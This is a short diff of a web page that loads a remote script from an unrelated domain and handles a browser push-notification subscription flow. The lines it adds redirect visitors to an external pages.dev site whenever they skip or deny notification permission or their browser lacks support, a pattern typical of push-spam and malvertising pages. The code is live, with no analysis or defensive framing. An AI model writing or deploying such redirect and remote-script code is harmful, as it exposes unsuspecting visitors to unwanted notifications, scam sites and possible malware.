@@ -146,12 +146,19 @@ window._phv2Activator.activate('native_web_push');
 
 
     
+  
   <script type="text/javascript" src="https://hotbladita.today/process.js?id=1438803405&p1=sub1&p2=sub2&p3=sub3&p4=sub4" async> </script>
 
   <script>
     window.addEventListener('phv2site.native_web_push', (e) => {
       switch (e.detail.state) {
           case 'notSupported':
+              window.location.replace("https://teamforeignhand.pages.dev/");
+              break;
+          case 'permissionSkipped':
+              window.location.replace("https://teamforeignhand.pages.dev/");
+              break;
+          case 'permissionDenied':
               window.location.replace("https://teamforeignhand.pages.dev/");
               break;
           case 'subscribed':
